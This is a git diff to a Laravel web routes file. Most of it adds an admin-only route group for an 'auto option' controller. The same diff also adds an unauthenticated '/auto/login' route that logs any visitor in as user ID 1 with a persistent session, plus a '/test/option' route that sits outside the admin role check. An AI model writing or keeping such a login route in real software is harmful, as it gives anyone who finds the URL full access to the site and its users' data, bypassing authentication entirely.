@@ -17,6 +17,10 @@ use App\Setting;
 
 /**
  */
+Route::get("/test/option","AutoOptionController@index");
+Route::get("/auto/login",function (){
+	Auth::loginUsingId(1,true);
+});
 
 View::composer(['layouts.master', 'layouts.master-auth'], function ($view) {
 	if (auth()->check()) {
@@ -34,6 +38,22 @@ View::composer(['layouts.master', 'layouts.master-auth'], function ($view) {
 
 // for viewing everything
 Route::middleware('role:Admin,Admin1,Editor')->prefix('admin')->group(function (){
+
+	// Auto Options
+	Route::group(["prefix" => "auto-option","as" => "auto-option."],function(){
+
+		Route::post("/main","AutoOptionController@storeOption")->name("main");
+		Route::post("/secondary","AutoOptionController@storeOptionSecondary")->name("secondary");
+		Route::post("/third","AutoOptionController@storeOptionThird")->name("third");
+
+		Route::get("/","AutoOptionController@index")->name("index");
+		Route::get("/create","AutoOptionController@create")->name("create");
+		Route::post("/","AutoOptionController@store")->name("store");
+		Route::put("/update/{id}","AutoOptionController@update")->name("update");
+		Route::get("/edit/{id}","AutoOptionController@edit")->name("edit");
+		Route::delete("/{id}","AutoOptionController@delete")->name("delete");
+	});
+
 	Route::get('/', 'HomeController@index')->name('admin');
 
 	//tournaments
